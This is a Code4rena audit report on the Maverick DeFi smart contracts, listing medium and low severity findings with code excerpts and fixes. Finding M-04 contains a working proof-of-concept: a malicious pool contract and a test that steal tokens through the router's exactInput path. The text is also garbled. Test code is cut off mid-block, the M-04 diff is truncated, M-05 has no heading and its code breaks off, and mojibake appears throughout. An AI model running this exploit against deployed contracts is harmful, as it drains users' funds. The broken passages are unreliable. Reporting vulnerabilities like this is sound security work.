# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the Maverick&ast; smart contract system written in Solidity. The audit contest took place between December 1â€”December 12 2022.

&ast;*Note: this contest originally ran under the name `Stealth Project`.*

This contest was judged by [kirk-baird](https://github.com/kirk-baird).

Final report assembled by [itsmetechjay](https://twitter.com/itsmetechjay).

# Summary

The C4 analysis yielded an aggregated total of 8 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 24 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 11 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review is composed of 34 smart contracts written in the Solidity programming language and includes 2,289 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# Medium Risk Findings (8)
## [[M-01] `Router.getOrCreatePoolAndAddLiquidity` can be frontrunned which leads to price manipulation](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/22)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/22)*

`Router.getOrCreatePoolAndAddLiquidity` can be frontrunned which allows the setting of a different initial price.

### Proof of Concept

When new Pool is created, it is already initialized with active tick (`Pool.sol#L76`). This allows the pool creator to provide price for assets.
So when first LP calls `Pool.addLiquidity`, this active tick is used to determine how many assets LP should deposit.

`Router.getOrCreatePoolAndAddLiquidity` function allows caller to add liquidity to the pool that can be not created yet. In such case it will create it with initial active tick provided by sender and then it will provide user's liquidity to the pool. In case the pool already exists, function will just add liquidity to it.

`Router.sol#L277-L287`

```solidity
    function getOrCreatePoolAndAddLiquidity(
        PoolParams calldata poolParams,
        uint256 tokenId,
        IPool.AddLiquidityParams[] calldata addParams,
        uint256 minTokenAAmount,
        uint256 minTokenBAmount,
        uint256 deadline
    ) external payable checkDeadline(deadline) returns (uint256 receivingTokenId, uint256 tokenAAmount, uint256 tokenBAmount, IPool.BinDelta[] memory binDeltas) {
        IPool pool = getOrCreatePool(poolParams);
        return addLiquidity(pool, tokenId, addParams, minTokenAAmount, minTokenBAmount);
    }
```

1. Pool of tokenA:tokenB doens't exist.
2. User calls `Router.getOrCreatePoolAndAddLiquidity` function to create pool with initial active tick and provide liquidity in same tx.
3. Attacker frontruns tx and creates such pool with different active tick.
4. `Router.getOrCreatePoolAndAddLiquidity` is executed and new Pool was not created, and liquidity was added to the Pool created by attacker.
5. Attacker swapped provided by first depositor tokens for a good price.
6. First depositor lost part of funds.

### Tools Used

VS Code

### Recommended Mitigation Steps

Do not allow actions together in one tx. Do it in 2 tx. First, create Pool. And in second tx, add liquidity.

## [[M-02] Pool address is not deterministic, the actual Pool address deployed may be different from the address computed in advance](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/27)
*Submitted by [hihen](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/27)*

Users and contracts associated with Maverick may result in errors or token losses due to using a wrong Pool address.

### Proof of Concept

Pools are deployed in a `create2` manner just like Uniswap. This is used to ensure that the pool contract address is deterministic and guaranteed, because in some scenarios it is necessary to know the address of the pool in advance and perform some operations.

However, the address of the Pool contract in the current implementation is not fully deterministic.

Let's see the code of `Deployer#deploy()`(`Deployer.sol#L24`):

```solidity
function deploy(
    uint256 _fee,
    uint256 _tickSpacing,
    int32 _activeTick,
    uint16 _lookback,
    uint16 _protocolFeeRatio,
    IERC20 _tokenA,
    IERC20 _tokenB,
    uint256 _tokenAScale,
    uint256 _tokenBScale,
    IPosition _position
) external returns (IPool pool) {
    pool = new Pool{salt: keccak256(abi.encode(_fee, _tickSpacing, _lookback, _tokenA, _tokenB))}(
        _fee,
        _tickSpacing,
        _activeTick,
        _lookback,
        _protocolFeeRatio,
        _tokenA,
        _tokenB,
        _tokenAScale,
        _tokenBScale,
        _position
    );
```

Any change in `_fee, _tickSpacing, _activeTick, _lookback, _protocolFeeRatio, _tokenA, _tokenB, _tokenAScale, _tokenBScale, _position` will result in a different contract address.

This is because they are all used as the Pool's constructor arguments which will be used to calculate the contract address.

> see [Salted contract creations / create2](https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2)

Of these parameters, only `_fee, _tickSpacing, _lookback, _tokenA, _tokenB` are used to determine a pool:

*   They are used to lookup (`Factory.sol#L46`) a pool
    ```solidity
    function lookup(uint256 _fee, uint256 _tickSpacing, uint16 _lookback, IERC20 _tokenA, IERC20 _tokenB) external view override returns (IPool pool) 
    ```
*   They are the keys of the pools mapping (`Factory.sol#L16`)

        mapping(uint256 => mapping(uint256 => mapping(uint32 => mapping(IERC20 => mapping(IERC20 => IPool))))) pools;

        pools[_fee][_tickSpacing][_lookback][_tokenA][_tokenB] = pool;

Other parameters are the properties or state of the pool. They do not determine a pool.

Some of them may be set to or modified to any value, which leads to the loss of determinism and guarantee of the pool address:

*   `_activeTick`: may be set to any value by creator when `create()`(`Factory.sol#L58`), :
*   `_protocolFeeRatio`: may be set to any value at any time by factory owner. See setProtocolFeeRatio (`Factory.sol#L33`)
*   `_tokenAScale, _tokenBScale`: may be set to any value at any time by token owner (if the token is  settable or upgradable)

### Tools Used

VS Code

### Recommended Mitigation Steps

I recommend using a similar approach to Uniswap, which is removing all constructor parameters of the Pool, saving them in factory's storage, and retrieving them by calling the factory in constructor.

## [[M-03] Trader can manipulate price because bin only moved after swap](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/35)
*Submitted by [gzeon](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/35)*

In Maverick, liquidity bin is only moved after a swap:

`Pool.sol#L305-L306`

```solidity
        emit Swap(msg.sender, recipient, tokenAIn, exactOutput, amountIn, amountOut, currentState.activeTick);
        _moveBins(currentState.activeTick, startingTick, lastTwa);
```

If the pool does not have a lot of activity (which is very common for newer DEX / tail asset), the bin will not be moved to the expected position. 

Trader will have a free option to manipulate price in their favor.

### Proof of Concept

Adding this test case to ./maverick-v1/test/models/Pool.ts

```typescript
    describe.only("when the twap moves and there are bins that can be moved", () => {
      beforeEach(async () => {
        await testPool.addLiquidity(1, [
          {
            kind: 1,
            isDelta: true,
            pos: 0,
            deltaA: floatToFixed(3),
            deltaB: floatToFixed(3),
          },
          {
            kind: 1,
            isDelta: true,
            pos: 2,
            deltaA: floatToFixed(3),
            deltaB: floatToFixed(3),
          },
          {
            kind: 1,
            isDelta: true,

      Pool
        #swap
          when the twap moves and there are bins that can be moved
    99999999997 99999999987.17587
            âœ“ +10, 0, -10
    99999999997 99999999983.95761
            âœ“ +10, -10

In the 1st test, the trader buys 10 tokens, waits an hour, sells 0 tokens (to update bin), sells 10 tokens.

In the 2nd test, the trader buys 10 tokens, waits an hour, sells 10 tokens.

As shown, if the trader executes a 0 token trade in between, he will receive many more tokens.

On the other hand, if the trader is trying to buy more tokens, he can get a better price if the bin is not updated.

### Recommended Mitigation Steps

Move the bin at the beginning of a swap after updating twap.

## [[M-04] `exactInput` allows stealing of funds via a malicious pool contract](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/64)
*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/64), also found by [peritoflores](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/97)*

`Router.sol#L151` 

`Router.sol#L128`

### Impact

Users can lose funds during swapping.

### Proof of Concept

The Router contract (`Router.sol#L18`) is a higher level contract that will be used by the majority of the users. The contract implements the `exactInput` (`Router.sol#L143`) functions that users call to perform multiple swaps in a single transaction. The key argument of the function is the path (`IRouter.sol#L40`): an encoded list of "input token, pool address, output token" tuples that defines the series of swaps to be made by the function. On every iteration, the `exactInput` function extracts next tuple from the path and calls the extracted pool address to perform a swap (`Router.sol#L149-L154`), (`Router.sol#L128`):

```solidity
params.amountIn = exactInputInternal(
    params.amountIn,
    stillMultiPoolSwap ? address(this) : params.recipient,
    0,
    SwapCallbackData({path: params.path.getFirstPool(), payer: payer, exactOutput: false})
);
```

```solidity
(, amountOut) = pool.swap(recipient, amountIn, tokenAIn, false, sqrtPriceLimitD18, abi.encode(data));
```

However, the pool address is not verified before being called. An attacker may trick a user into calling `exactInput` with a malicious contract as a pool and steal user's funds. Despite the requirement to force a user to sign a transaction, the difficulty of this attack is low for several reasons:

1. The path argument is *always* built by a front-end applications: users never fill it manually and have to trust front ends to properly fill the path for them. For example, Uniswap implements a complex [router](https://uniswap.org/blog/auto-router) that builds optimized paths. It's expected that the audited project will also implement a similar router, and the users will always use the paths generated by the router without checking them.

    Moreover, the path argument is encoded as a byte array (`IRouter.sol#L40`), which makes it hard to read and verify in a wallet.

2. The attack is performed by the official Router contract: users may have it added to the list of known contracts (a feature supported by MetaMask) and execute a transaction from a malicious front-end application thinking that, since the official Router contract is called, they're safe.

An example of a malicious pool contract:

```solidity
// router-v1/contracts/audit/AuditSwapExploit.sol
// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../interfaces/IRouter.sol";

contract AuditSwapExploit {
  address tokenAddress;

  constructor(address tokenAddress_) {
    tokenAddress = tokenAddress_;
  }

  function swap(address /*recipient*/, uint256 amount, bool /*tokenAIn*/, bool /*exactOutput*/, uint256 /*sqrtPriceLimit*/, bytes calldata /*data*/) external returns (uint256 amountIn, uint256 amountOut) {
    IRouter(msg.sender).sweepToken(IERC20(tokenAddress), 0, address(this));

    amountIn = amount;
    amountOut = type(uint256).max;
  }
}
```

A coded proof of concept that demonstrates an attack using the above contract:

```js
// router-v1/test/Router.ts
//   describe("#swap exact in", () => {
it("allows to steal funds [AUDIT]", async () => {
  let poolWETHB: string = await getEthBPool(0.05, 2);

  // Deploying a exploit.
  const factory = await ethers.getContractFactory("AuditSwapExploit", {});
  const exploit = await factory.deploy(tokenB.address);
  await exploit.deployed();

  const preExploitBalance = await balances(exploit.address);
  const preOwnerBalance = await balances(await owner.getAddress());

  // The attacker injects their exploit in the path.
  let path = encodePath([
    weth9.address,
    poolWETHB,
    tokenB.address,
    exploit.address,
    tokenA.address,
  ]);
  await router.exactInput({
    path: path,
    recipient: await owner.getAddress(),
    deadline: maxDeadline,
    amountIn: floatToFixed(1),
    amountOutMinimum: 0
  });

  const postExploitBalance = await balances(exploit.address);
  const postOwnerBalance = await balances(await owner.getAddress());

  // User has spent WETH...
  expect(postOwnerBalance.weth9 - preOwnerBalance.weth9).to.eq(-1);

  // ... but hasn't received any tokens.
  expect(postOwnerBalance.tokenA - preOwnerBalance.tokenA).to.eq(0);
  expect(postOwnerBalance.tokenB - preOwnerBalance.tokenB).to.eq(0);

  // The exploit contract has received token B.
  expect(postExploitBalance.tokenA - preExploitBalance.tokenA).to.eq(0);
  expect(postExploitBalance.tokenB - preExploitBalance.tokenB).to.eq(0.817728003274796);
});
```

### Recommended Mitigation Steps

Consider always checking that pools being called in the Router were created through the Factory:

```diff
--- a/router-v1/contracts/Router.sol
+++ b/router-v1/contracts/Router.sol
@@ -125,6 +125,7 @@ contract Router is IRouter, Multicall, SelfPermit, Deadline {

         bool tokenAIn = tokenIn < tokenOut;

         (, amountOut) = pool.swap(recipient, amountIn, tokenAIn, false, sqrtPriceLimitD18, abi.encode(data));
     }

```

`Router.sol#L90-L91`

### Impact 

UsersÂ mayÂ loseÂ aÂ portionÂ ofÂ ETHÂ whenÂ settingÂ aÂ limitÂ priceÂ andÂ sellingÂ ETH. 

### ProofÂ ofÂ Concept 

TheÂ RouterÂ contract (`Router.sol#L18`) isÂ aÂ higherÂ levelÂ contractÂ thatÂ willÂ beÂ usedÂ byÂ the majorityÂ ofÂ theÂ users.

TheÂ contractÂ allowsÂ toÂ swapÂ tokensÂ usingÂ PoolÂ contracts. OneÂ extraÂ featureÂ itÂ addsÂ isÂ theÂ abilityÂ toÂ swapÂ nativeÂ coinsÂ (e.g.Â ETH) forÂ ERC20Â tokensÂ soÂ usersÂ don'tÂ needÂ toÂ wrapÂ nativeÂ coinsÂ manuallyÂ (`Router.sol#L88-L91`): 

 ```solidity 
 functionÂ pay(IERC20Â token,Â addressÂ payer,Â addressÂ recipient,Â uint256Â value)Â internalÂ { 
 Â Â Â Â ifÂ (IWETH9(address(token))Â ==Â WETH9Â &&Â address(this).balanceÂ >=Â value)Â { 
 Â Â Â Â Â Â Â Â WETH9.deposit{value:Â value}(); 
 Â Â Â Â Â Â Â Â WETH9.transfer(recipient,Â value); 
 ``` 
  
TheÂ PoolÂ contractÂ allowsÂ toÂ setÂ aÂ limitÂ priceÂ duringÂ swapping:Â aÂ price,Â uponÂ reachingÂ which,Â swappingÂ willÂ stopÂ atÂ (`Pool.sol#L636-L641`).Â WhenÂ aÂ limitÂ priceÂ isÂ setÂ andÂ reached,Â theÂ swapÂ isÂ executedÂ partially:Â theÂ inputÂ amountÂ specifiedÂ inÂ theÂ callÂ toÂ `swap`Â isÂ spentÂ partiallyÂ (`Pool.sol#L565`);Â theÂ outputÂ amountÂ isÂ calculatedÂ onlyÂ basedÂ onÂ theÂ inputÂ amountÂ spent.Â ThisÂ mechanismÂ allowsÂ tradersÂ toÂ executeÂ aÂ swap onlyÂ untilÂ aÂ certainÂ priceÂ isÂ reached. 
  
TheÂ combinationÂ ofÂ theÂ aboveÂ factsÂ allowsÂ aÂ bug:Â whenÂ userÂ sellsÂ aÂ nativeÂ coinÂ (e.g.Â ETH),Â specifiesÂ fullÂ inputÂ amount,Â andÂ setsÂ aÂ limitÂ price,Â theÂ actualinputÂ amountÂ willÂ beÂ smallerÂ dueÂ toÂ theÂ limitÂ priceÂ beingÂ set,Â butÂ theÂ fullÂ inputÂ amountÂ willÂ beÂ spentÂ byÂ theÂ user.Â TheÂ RouterÂ won'tÂ refundÂ theÂ remainingÂ amountÂ toÂ theÂ userÂ andÂ it'llÂ beÂ leftÂ inÂ theÂ contract.Â AnyoneÂ (MEVÂ bots,Â mostÂ likely)Â willÂ beÂ ableÂ toÂ withdrawÂ itÂ viaÂ theÂ publicÂ `refundETH`Â functionÂ (`Router.sol#L80-L82`). 
  
ConsiderÂ thisÂ exploitÂ scenario: 
1. AliceÂ wantsÂ toÂ sellÂ 1Â ETHÂ andÂ buyÂ someÂ tokenÂ TKN. However AliceÂ wantsÂ herÂ tradeÂ toÂ beÂ executedÂ beforeÂ theÂ priceÂ X. 
2. AliceÂ callsÂ theÂ `exactInputSingle`Â functionÂ ofÂ `Router`,Â setsÂ theÂ sqrtPriceLimitD18Â argumentÂ toÂ theÂ priceÂ X,Â andÂ sendsÂ 1Â ETHÂ alongÂ withÂ theÂ transaction. 
3. TheÂ routerÂ executesÂ theÂ swapÂ viaÂ anÂ ETH-TKNÂ pool.Â TheÂ swapÂ getsÂ interruptedÂ whenÂ theÂ priceÂ XÂ isÂ reached. 
4. BeforeÂ reachingÂ theÂ priceÂ X,Â onlyÂ 0.7Â ETHÂ ofÂ AliceÂ wereÂ consumedÂ toÂ convertÂ themÂ toÂ 100Â TKN. 
5. AliceÂ receivesÂ 100Â TKNÂ whileÂ spendingÂ 1Â ETH,Â theÂ routerÂ contractÂ keepsÂ holdingÂ theÂ remainingÂ 0.3Â ETH. 
6. AÂ MEVÂ botÂ withdrawsÂ theÂ 0.3Â ETHÂ byÂ callingÂ theÂ `refundETH`Â function. 
 
TheÂ belowÂ PoCÂ reproducesÂ thisÂ scenario: 
```js 
//Â router-v1/test/Router.ts 
//Â Â Â describe("#swapÂ exactÂ in",Â ()Â =>Â {

## [[M-06] `Pool._amountToBin()` returns a wrong value when `protocolFeeRatio = 100%`.](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/85)
*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/85)*

`Pool._amountToBin()` returns a larger value than it should when `protocolFeeRatio = 100%`.

As a result, bin balances might be calculated incorrectly.

### Proof of Concept

`delta.deltaInBinInternal` is used to update the bin balances like this (`Pool.sol#L287-L293`).

```solidity
    if (tokenAIn) {
        binBalanceA += delta.deltaInBinInternal.toUint128();
        binBalanceB = Math.clip128(binBalanceB, delta.deltaOutErc.toUint128());
    } else {
        binBalanceB += delta.deltaInBinInternal.toUint128();
        binBalanceA = Math.clip128(binBalanceA, delta.deltaOutErc.toUint128());
    }
```

As we can see here (`Pool.sol#L608-L611`), `_amountToBin()` is used to calculate`  delta.deltaInBinInternal ` from `deltaInErc` and `feeBasis`.

```solidity
    uint256 feeBasis = Math.mulDiv(binAmountIn, fee, PRBMathUD60x18.SCALE - fee, true);
    delta.deltaInErc = binAmountIn + feeBasis;
    delta.deltaInBinInternal = _amountToBin(delta.deltaInErc, feeBasis);
    delta.excess = swapped ? Math.clip(amountOut, delta.deltaOutErc) : 0;
```

With the above code, the protocol fee should be a portion of `feeBasis` and it is the same as `feeBasis` when `state.protocolFeeRatio = ONE_3_DECIMAL_SCALE`.

But when we check `_amountToBin()`, the actual protocol fee will be `feeBasis + 1` and `delta.deltaInBinInternal` will be less than its possible smallest value(= `binAmountIn`).

```solidity
    function _amountToBin(uint256 deltaInErc, uint256 feeBasis) internal view returns (uint256 amount) { 
        amount = state.protocolFeeRatio != 0 ? Math.clip(deltaInErc, feeBasis.mul(uint256(state.protocolFeeRatio) * PROTOCOL_FEE_SCALE) + 1) : deltaInErc;
    }
```

### Recommended Mitigation Steps

We should modify `_amountToBin()` like below.

```solidity
    function _amountToBin(uint256 deltaInErc, uint256 feeBasis) internal view returns (uint256 amount) { 
        if (state.protocolFeeRatio == ONE_3_DECIMAL_SCALE)
            return deltaInErc - feeBasis;

        amount = state.protocolFeeRatio != 0 ? Math.clip(deltaInErc, feeBasis.mul(uint256(state.protocolFeeRatio) * PROTOCOL_FEE_SCALE) + 1) : deltaInErc;
    }
```

## [[M-07] TWA update is not correct](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/105)
*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/105)*

Time-warped-price is updated incorrectly and this affects moving bins.

### Proof of Concept

The protocol updates `twa` on every swap and uses that to decide how to move bins.

But in the function `swap()`, the delta's `endSqrtPrice` can not contribute negatively to the `activeTick` because it is wrapped with a `clip()` function.

```solidity
// Pool.sol
286:         if (amountOut != 0) {
287:             if (tokenAIn) {
288:                 binBalanceA += delta.deltaInBinInternal.toUint128();
289:                 binBalanceB = Math.clip128(binBalanceB, delta.deltaOutErc.toUint128());
290:             } else {
291:                 binBalanceB += delta.deltaInBinInternal.toUint128();
292:                 binBalanceA = Math.clip128(binBalanceA, delta.deltaOutErc.toUint128());
293:             }
294:             twa.updateValue(currentState.activeTick * PRBMathSD59x18.SCALE + int256(Math.clip(delta.endSqrtPrice, delta.sqrtLowerTickPrice).div(delta.sqrtUpperTickPrice - delta.sqrtLowerTickPrice)));//@audit second part of the sum is always positive, should contribute both ways
295:         }
296:
```

I believe `delta.endSqrtPrice` should contribute both ways to the `activeTick` and it is quite possible for the `endSqrtPrice` to be out of the range `(delta.sqrtLowerTickPrice, delta.sqrtUpperTickPrice)`. (In another report, I mentioned an issue of accuracy loss in the calculation of `endSqrtPrice`).

### Recommended Mitigation Steps

I recommend changing the relevant line as below without using `clip()` so that the `endSqrtPrice` can contribute to the `twa` reasonably.

```solidity
294:             twa.updateValue(currentState.activeTick * PRBMathSD59x18.SCALE + int256((delta.endSqrtPrice, delta.sqrtLowerTickPrice).div(delta.sqrtUpperTickPrice - delta.sqrtLowerTickPrice)));
```

 > The suggested mitigation is not correct, but this did alert us to a related issue in calculating the fractional part of the log TWAP when swap to `sqrtPriceLimit` is used for `tokenAIn=false` and when there is a gap between bins.  In that case, the fractional part of the twap is not accurate.  We will implement a fix.

## [[M-08] The calculation of LP token amount and deposit amount is wrong for edge cases](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/112)
*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/112)*

`Bin.sol#L35` 

`Bin.sol#L38`

### Impact

The wrong amount of LP tokens will be minted and the wrong amount of A/B tokens will be deposited.

### Proof of Concept

According to the PDF document provided, the number of LP tokens newSupply is calculated using the Table 1 as below.

![Imgur](https://imgur.com/dazNron.jpg)

This is implemented in the function `lpTokensFromDeltaReserve()` of Bin.sol as below.

```solidity
    function lpTokensFromDeltaReserve(
        Bin.Instance storage self,
        uint256 _deltaA,
        uint256 _deltaB,
        int32 _activeLowerTick,
        uint256 _existingReserveA,
        uint256 _existingReserveB
    ) internal view returns (uint256 deltaAOptimal, uint256 deltaBOptimal, uint256 proRataLiquidity) {
        deltaAOptimal = _deltaA;
        deltaBOptimal = _deltaB;
        bool noA = self.state.reserveA == 0;
        bool noB = self.state.reserveB == 0;

        if (self.state.lowerTick < _activeLowerTick || (!noA && noB)) {//@audit case p<p_l, the inequality should be opposite side
            deltaBOptimal = 0;
            proRataLiquidity = noA || self.state.totalSupply == 0 ? deltaAOptimal : Math.mulDiv(deltaAOptimal, self.state.totalSupply, self.state.reserveA, false);
        } else if (self.state.lowerTick > _activeLowerTick || (noA && !noB)) {//@audit case p>p_u, the inequality should be opposite side
            deltaAOptimal = 0;
            proRataLiquidity = noB || self.state.totalSupply == 0 ? deltaBOptimal : Math.mulDiv(deltaBOptimal, self.state.totalSupply, self.state.reserveB, false);
        } else {
            if (_existingReserveA > 0) {
                deltaBOptimal = Math.mulDiv(_existingReserveB, _deltaA, _existingReserveA, false);
            }
            if (deltaBOptimal > _deltaB && _existingReserveB > 0) {
                deltaAOptimal = Math.mulDiv(_existingReserveA, _deltaB, _existingReserveB, false);
                deltaBOptimal = _deltaB;
            }

            proRataLiquidity = (noA && noB) || self.state.totalSupply == 0
                ? Math.max(deltaAOptimal, deltaBOptimal)
                : Math.min(Math.mulDiv(deltaAOptimal, self.state.totalSupply, self.state.reserveA, false), Math.mulDiv(deltaBOptimal, self.state.totalSupply, self.state.reserveB, false));
        }
    }
```

The implementation uses wrong inequalities for the edge cases $p\lt p_l$ and $p\gt p_u$.

### Recommended Mitigation Steps

Reverse the inequalities at Bin.sol#L35 and Bin.sol#L38.

## [L-01] Draft Openzeppelin Dependencies

The `SelfPermit.sol` contract utilised draft-IERC20Permit.sol, an OpenZeppelin contract. This contract is still a draft and is not considered ready for mainnet use. OpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.

(`SelfPermit.sol#L5`)

```solidity
router-v1/contracts/libraries/SelfPermit.sol:
  1: // SPDX-License-Identifier: GPL-2.0-or-later

  5: import "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";
```
## [L-02] It is safer to change the `owner` address with the `safeSetOwner` pattern

```solidity
maverick-v1/contracts/models/Factory.sol:
  39  
  40:     function setOwner(address _owner) external {
  41:         require(msg.sender == owner && _owner != address(0), "Factory:NOT_ALLOWED");
  42:         owner = _owner;
  43:         emit SetFactoryOwner(_owner);
  44:     }

```

The `owner` address change is done with the `setOwner` function, but there is a risk of incorrect address definition here, it is a serious risk for the platform, so it is safer to do it with the `safeSetOwner` pattern.

### Recommendation
Use ``Ownable2Step.sol``

[Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)

## [L-03] There is a risk that the `proxyFee` variable is accidentally initialized to 0 and platform loses money

With the `setProtocolFeeRatio()` in the ` Factory.sol `  and `Pool.sol` files, the initial rate of ` protocolFeeRatio ` is set with an argument of type uint16, but there is no check that prevents this rate from starting with 0.

There is a risk that the `protocolFeeRatio` variable is accidentally initialized to 0

Starting proxyFee with 0 is an administrative decision, but since there is no information about this in the documentation and NatSpec comments during the audit, we can assume that it will not be 0

In addition, it is a strong belief that it will not be 0, as it is an issue that will affect the platform revenues.

Although the value initialized with 0 by mistake or forgetting can be changed later by onlyOwner/Owner, in the first place it can be exploited by users and cause huge amount  usage

`require == 0` should not be made because of the possibility of the platform defining the `0` rate.

With bool it can be confirmed that checking for 0 and this will not skip `function setProtocolFeeRatio(uint16 _protocolFeeRatio, bool isZero)`
In this way ; It can be set to `0` at any time and the possibility of error is eliminated.

maverick-v1/contracts/models/Factory.sol:
  32  
  33:     function setProtocolFeeRatio(uint16 _protocolFeeRatio) external {
  34:         require(msg.sender == owner, "Factory:NOT_ALLOWED");
  35:         require(_protocolFeeRatio <= ONE_3_DECIMAL_SCALE, "Factory:PROTOCOL_FEE_CANNOT_EXCEED_ONE");
  36:         protocolFeeRatio = _protocolFeeRatio;
  37:         emit SetFactoryProtocolFeeRatio(_protocolFeeRatio);
  38:     }

maverick-v1/contracts/models/Pool.sol:
  331  
  332:     function setProtocolFeeRatio(uint16 _protocolFeeRatio) internal {
  333:         require(_protocolFeeRatio <= ONE_3_DECIMAL_SCALE);
  334:         state.protocolFeeRatio = _protocolFeeRatio;
  335: 
  336:         emit SetProtocolFeeRatio(_protocolFeeRatio);
  337:     }

```

## [L-04] Use ```safeTransferOwnership``` instead of ```transferOwnership``` function

`Position.sol#L12`

`PositionMetadata.sol#L8`

```transferOwnership``` function is used to change Ownership from ```Ownable.sol```.

Use a 2 structure transferOwnership which is safer. 

```safeTransferOwnership```,  use it is more secure due to 2-stage ownership transfer.

### Recommendation
Use ``Ownable2Step.sol``

[Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)

## [L-05] Owner can renounce Ownership

(`Position.sol#L12`)

(`PositionMetadata.sol#L8`)

Typically, the contractâ€™s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.

The Openzeppelinâ€™s Ownable used in this project contract implements renounceOwnership. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.

`onlyOwner` functions:
```js
maverick-v1/contracts/models/PositionMetadata.sol:
   8: contract PositionMetadata is IPositionMetadata, Ownable {

  17:     function setBaseURI(string memory _baseURI) external onlyOwner {
  21:     function tokenURI(uint256 tokenId) external view override returns (string memory) {


maverick-v1/contracts/models/Position.sol:
  12: contract Position is ERC721, ERC721Enumerable, Ownable, IPosition {

  23:     function setMetadata(IPositionMetadata _metadata) external onlyOwner {

```

### Recommendation
We recommend either reimplementing the function to disable it or clearly specifying if it is part of the contract design.

## [L-06] Missing Event for critical parameters change

```js
1 result - 1 file

maverick-v1/contracts/models/PositionMetadata.sol:
  16  
  17:     function setBaseURI(string memory _baseURI) external onlyOwner {
  18:         baseURI = _baseURI;
  19:     }

```

Events help non-contract tools to track changes, and events prevent users from being surprised by changes.

### Recommendation

Add Event-Emit.

## [L-07]  A single point of failure 

`Position.sol#L12`

`PositionMetadata.sol#L8`

The `owner` role has a single point of failure and `onlyOwner` can use critical a few functions.

`owner` role in the project:

Owner is not behind a multisig and changes are not behind a timelock.

Even if protocol admins/developers are not malicious there is still a chance for Owner keys to be stolen. In such a case, the attacker can cause serious damage to the project due to important functions. In such a case, users who have invested in project will suffer high financial losses.


`onlyOwner` functions:
```js
maverick-v1/contracts/models/PositionMetadata.sol:
   8: contract PositionMetadata is IPositionMetadata, Ownable {

  17:     function setBaseURI(string memory _baseURI) external onlyOwner {
  21:     function tokenURI(uint256 tokenId) external view override returns (string memory) {


maverick-v1/contracts/models/Position.sol:
  12: contract Position is ERC721, ERC721Enumerable, Ownable, IPosition {

  23:     function setMetadata(IPositionMetadata _metadata) external onlyOwner {

```

This increases the risk of ```A single point of failure```.

### Recommendation
Add a time lock to  critical functions. Admin-only functions that change critical parameters should emit events and have timelocks. 

Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services.

Allow only multi-signature wallets to call the function to reduce the likelihood of an attack.

Also detail them in documentation and NatSpec comments.

## [L-08] Some ERC20 tokens should need to approve(0) first

Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.

```solidity

1 result - 1 file

router-v1/contracts/libraries/TransferHelper.sol:
  32      /// @param value The amount of the given token the target will be allowed to spend
  33:     function safeApprove(address token, address to, uint256 value) internal {
  34:         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, to, value));
  35:         require(success && (data.length == 0 || abi.decode(data, (bool))), "SA");
  36:     }

```

When using one of these unsupported tokens, all transactions revert and the protocol cannot be used.

### Recommended Mitigation Steps
Approve with a zero amount first before setting the actual amount.

```solidity
+          IERC20.approve.selector, to, 0);
            IERC20.approve.selector, to, value);
```

## [L-09] Not using the latest version of `prb-math` from dependencies

`prb-math` is an important mathematical library
The package.json configuration file says that the project is using 2.2.0 of `prb-math` which is not the last updated version.

```js
1 result - 1 file

router-v1/package.json:
  17:   "dependencies": {
  24:     "prb-math": "^2.2.0",
```

### Recommendation
Use patched versions.

## [L-10] Loss of precision due to rounding


```solidity

router-v1/contracts/libraries/Path.sol:
  15:     uint256 private constant ADDR_SIZE = 20;
  18:     uint256 private constant NEXT_OFFSET = ADDR_SIZE + ADDR_SIZE;

  34:     function numPools(bytes memory path) internal pure returns (uint256) {
  35:         // Ignore the first token address. From then on every fee and token offset indicates a pool.
  36:         return ((path.length - ADDR_SIZE) / NEXT_OFFSET);
  37:     }

```

